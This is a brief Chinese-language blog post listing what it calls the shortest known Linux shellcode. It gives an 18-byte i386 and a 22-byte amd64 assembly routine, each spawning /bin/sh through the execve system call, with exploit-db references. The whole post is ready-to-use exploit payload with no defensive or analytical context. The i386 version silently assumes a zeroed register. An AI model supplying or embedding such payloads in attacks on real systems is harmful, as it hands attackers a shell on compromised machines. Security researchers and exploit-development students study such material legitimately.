---
title: linux我知道的最短shellcode
abbrlink: 34036
date: 2020-04-16 11:50:52
tags:
---

i386长度18

```bash
push   0xb
pop    eax
push   ebx
push   0x68732f2f
push   0x6e69622f
mov    ebx,esp
int    0x80
```

来源：https://www.exploit-db.com/exploits/44321
amd64长度22

```bash
xor 	rsi,	rsi			
push	rsi				
mov 	rdi,	0x68732f2f6e69622f	 
push	rdi
push	rsp		
pop	rdi				
mov 	al,	59			
cdq					
syscall
```
https://www.exploit-db.com/exploits/41750
